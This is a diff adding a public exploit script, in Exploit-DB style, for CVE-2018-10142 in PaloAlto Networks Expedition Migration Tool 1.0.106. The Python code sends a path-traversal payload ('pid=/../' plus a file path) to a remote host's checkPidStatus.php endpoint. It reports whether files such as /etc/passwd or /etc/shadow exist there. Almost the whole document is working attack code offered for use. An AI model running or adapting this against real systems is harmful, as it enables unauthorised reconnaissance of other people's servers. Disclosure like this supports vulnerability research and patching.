@@ -1,0 +1,64 @@
+# Exploit Title: PaloAlto Networks Expedition Migration Tool 1.0.106 - Information Disclosure
+# Date: 2018-11-28
+# Exploit Author: paragonsec @ Critical Start
+# Vendor Homepage: https://live.paloaltonetworks.com/t5/Expedition-Migration-Tool/ct-p/migration_tool
+# Software Link: https://paloaltonetworks.app.box.com/s/davuvo65k727nm7feuug0d783zo6fjx8
+# Version: 1.0.106
+# Tested on: Linux
+# CVE : 2018-10142
+
+#!/usr/bin/env python
+ 
+import argparse
+import requests
+import sys
+import collections
+
+#Colors
+OKRED = '\033[91m'
+OKGREEN = '\033[92m'
+ENDC = '\033[0m'
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--rhost", help = "Remote Host")
+parser.add_argument('--file', help = 'File to check (e.g /etc/passwd, /etc/shadow)')
+args = parser.parse_args()
+
+# Check to ensure at least one argument has been passed
+if len(sys.argv)==1:
+    parser.print_help(sys.stderr)
+    sys.exit(1)
+
+rhost = args.rhost
+rfile = args.file
+
+exploit_url = "http://" + rhost + "/API/process/checkPidStatus.php"
+ 
+headers = [
+    ('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
+    ('Accept', 'application/json, text/javascript, */*; q=0.01'),
+    ('Accept-Language', 'en-US,en;q=0.5'),
+    ('Accept-Encoding', 'gzip, deflate'),
+    ('Connection', 'close')
+]
+ 
+# probably not necessary but did it anyways
+headers = collections.OrderedDict(headers)
+ 
+# Setting up GET body parameters
+body = "pid=/../" + rfile
+
+print(OKGREEN + "Author: " + ENDC + "paragonsec @ Critical Start (https://www.criticalstart.com)")
+print(OKGREEN + "CVE: " + ENDC + "2018-10142")
+print(OKGREEN + "Description: " + ENDC + "Information Disclosure in Expedition Migration Tool")
+print(OKGREEN + "Vuln Versions: " + ENDC + "< 1.0.107\n")
+
+print(OKGREEN + "[+]" + ENDC + "Running exploit...")
+
+s = requests.Session()
+
+req = requests.post(exploit_url, headers=headers, data=body)
+if "false" not in req.text:
+    print(OKGREEN + "[+]" + ENDC + "Exploit worked! " + rfile + " exists!\n")
+else:
+    print(OKRED + "[!]" + ENDC + "File " + rfile + " does not exist!\n")
